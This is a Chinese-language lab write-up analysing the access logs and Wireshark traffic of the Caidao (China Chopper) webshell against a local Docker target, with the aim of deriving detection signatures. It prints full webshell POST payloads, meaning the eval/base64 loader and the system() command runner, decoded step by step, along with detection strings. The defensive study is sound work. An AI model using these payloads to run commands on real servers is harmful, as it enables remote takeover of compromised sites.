更新时间：2025年06月24日18:00:37



# 文件结构
![](images/1750759271186-25a4e282-d841-4e4c-8a38-aff510dd6917.png)

# 环境准备
分析机：Windows 10 

靶机：docker环境 192.168.13.1

攻击工具：菜刀 [https://github.com/raddyfiy/caidao-official-version](https://github.com/raddyfiy/caidao-official-version)

分析工具：网站访问日志access.log、wireshark



待分析菜刀版本：

chopper.exe：md5各版本校验码（仅exe主程序）: 

20111116 => 5001ef50c7e869253a7c152a638eab8a

# 启动方法
```python
docker-compose up -d --build
```



![](images/1750759071158-033e7f2b-ef99-4d01-a903-1645319ff928.png)





然后访问http://目标ip:8080端口



![](images/1750759096184-97b81a04-4df2-48a6-aa4a-cf24559ecd9c.png)

此时在access_logs目录下存在access.log文件，并有访问日志：



![](images/1750176417009-7f0ce4ef-e0b1-4fc9-8d72-8840bb4387f3.png)

# 菜刀特征分析
按照提示，直接使用菜刀webshell工具连接，并在此过程中，抓包分析流量特征：



![](images/1750176700143-ce10c032-eb38-4bdf-8f67-11735fe3b303.png)





![](images/1750176745303-f79c5286-383a-4ae6-845c-4814b67d512a.png)



连接之后，执行命令操作以及文件操作：



![](images/1750304232119-c73369d5-3a17-436b-8f61-81114aaa0caf.png)



此时抓包停止，准备分析包。

# 特征分析
## access.log日志
在连接之后，可以在日志里面看到连接shell的请求都是post请求，初版是没有ua请求信息的：



![](images/1750304469080-2301d3ed-82fd-4b0a-825e-52c178f9c489.png)



## 流量分析
### 第一段建立连接流量分析
分析wireshark抓包流量，过滤http请求：



![](images/1750304437934-207d700d-18e9-433e-a2d9-3252dc21d746.png)



追踪第34个包看下：



![](images/1750304524195-b7c08445-7fc9-438f-84fc-b547871454bb.png)



```python
POST /shell.php HTTP/1.1
X-Forwarded-For: 7.29.79.149
Referer: http://192.168.13.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 192.168.13.1:8080
Content-Length: 639
Connection: Close
Cache-Control: no-cache

pass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuZXRzdGF0IC1hbiB8IGdyZXAgRVNUQUJMSVNIRUQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd
HTTP/1.1 200 OK
Date: Thu, 19 Jun 2025 03:39:42 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<h3>.... Caidao Webshell .........</h3><p>................................................POST ............ <code>pass</code></p>->|/bin/sh: 1: netstat: not found
[S]
/var/www/html
[E]
|<-
```



从这里可以看到一句话木马的连接密码就是pass：



![](images/1750305080766-a08a77f9-609d-46c9-8587-091378ae10e7.png)



对其解码分析，首先经过url解码：

```python
pass=@eval(base64_decode($_POST[z0]));
z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=
z1=L2Jpbi9zaA==
z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuZXRzdGF0IC1hbiB8IGdyZXAgRVNUQUJMSVNIRUQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd
```



再经过base64解码，z0解码：

```python
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;
$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
$r="{$p} {$c}";
@system($r." 2>&1",$ret);
print ($ret!=0)?"\nret={$ret}":"";;
echo("|<-");die();
```



z1解码：

```python
/bin/sh
```



z2解码：

```python
cd "/var/www/html";netstat -an | grep ESTABLISHED;echo [S];pwd;echo [E]
```



通过ai结合分析得知，解码后的代码是一个PHP Web Shell，接收Base64编码的POST参数z0、z1和z2，最终在服务器上执行Shell命令：

```python
cd "/var/www/html";netstat -an | grep ESTABLISHED;echo [S];pwd;echo [E]
```



输出网络连接信息和当前目录路径，标记为->|和|<-。

### 第二段命令执行流量分析
现在分析第56条流量，追踪一下看看：



![](images/1750305526761-edecb562-e167-44a4-973e-f786ca8cf191.png)

```python

pass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtkaXI7ZWNobyBbU107cHdkO2VjaG8gW0Vd
```



url进行第一次解码：

```python
pass=@eval(base64_decode($_POST[z0]));
z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=
z1=L2Jpbi9zaA==
z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtkaXI7ZWNobyBbU107cHdkO2VjaG8gW0Vd
```



z0进行base64解码：

```python
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;
$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
$r="{$p} {$c}";
@system($r." 2>&1",$ret);
print ($ret!=0)?"\nret={$ret}":"";;
echo("|<-");die();
```



z1解码：

```python
/bin/sh
```



z2解码：

```python
cd "/var/www/html";dir;echo [S];pwd;echo [E]
```



<font style="color:black;">最终执行的命令，在Linux系统上，PHP代码会构造并执行以下命令：</font>

```bash
/bin/sh -c "cd \"/var/www/html\";dir;echo [S];pwd;echo [E]" 2>&1
```

<font style="color:black;">这会：</font>

+ <font style="color:black;">切换到</font><font style="color:black;">/var/www/html</font><font style="color:black;">目录。</font>
+ <font style="color:black;">列出该目录下的文件和文件夹。</font>
+ <font style="color:black;">输出当前工作目录路径。</font>
+ <font style="color:black;">用</font><font style="color:black;">[S]</font><font style="color:black;">和</font><font style="color:black;">[E]</font><font style="color:black;">标记输出结果。</font>

从返回包上看，确实返回了执行的结果：



![](images/1750307078581-5d225263-ddd9-4504-94b7-693a84266d0a.png)







### 流量分析总结
由此可知，中国菜刀20111116版本的特征里面存在`z0`、`z1`、`z2`参数，此时还存在`QGluaV9zZXQo`这段字符，当然，该段字符并不一定不是中国菜刀独有的固定特征，但是可以作为辅助进一步判断。

# 实验结束
分析完成之后，使用：

```python
docker-compose down
```





![](images/1750759152189-af6663e0-2788-4147-86d1-1d37754c5e93.png)



















